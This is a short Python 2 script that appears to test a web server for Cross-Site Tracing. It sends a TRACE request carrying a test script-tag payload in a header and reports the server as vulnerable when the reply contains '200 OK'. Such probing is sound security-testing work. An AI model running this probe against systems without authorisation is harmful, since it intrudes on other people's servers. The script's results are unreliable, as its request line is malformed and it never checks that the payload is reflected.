#!/usr/bin/env python

import socket
import sys

__author__ = 'Aishee'
__email__ = 'xxxx@mail'
__license__ = 'GPL'
__version__ = '1.0'

def main(argv):
    target = argv[1]
    port = argv[2]
    
    header_method = "TRACE / HTTP /1.1"
    header_payload = "Test: <script>alert('1');</script>"
    header_host = "Host: %s"%(target)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = s.connect_ex((target, int(port)))
    s.settimeout(5.0)
    
    if result == 0:
        print 'Testing for cross-site tracing...'
        s.send(header_method + "\n")
        s.send(header_payload + "\n")
        s.send(header_host + "\n\n")
        data = s.recv(1024)
        if '200 OK' in data:
            print "%s:%s appears to be vulnerable to Cross Site Tracing (XST) attack" %(target, port)
        else:
            print "%s:%s does not appear vulnerable to Cross Site Tracing (XST)"%(target, port)
    else:
        print 'Unable to establish connection to %s:%s' %(target, port)
    s.close()

if __name__ == '__main__':
    if len(sys.argv) > 2:
        main(sys.argv)
    else:
        print 'Usage: url port ....'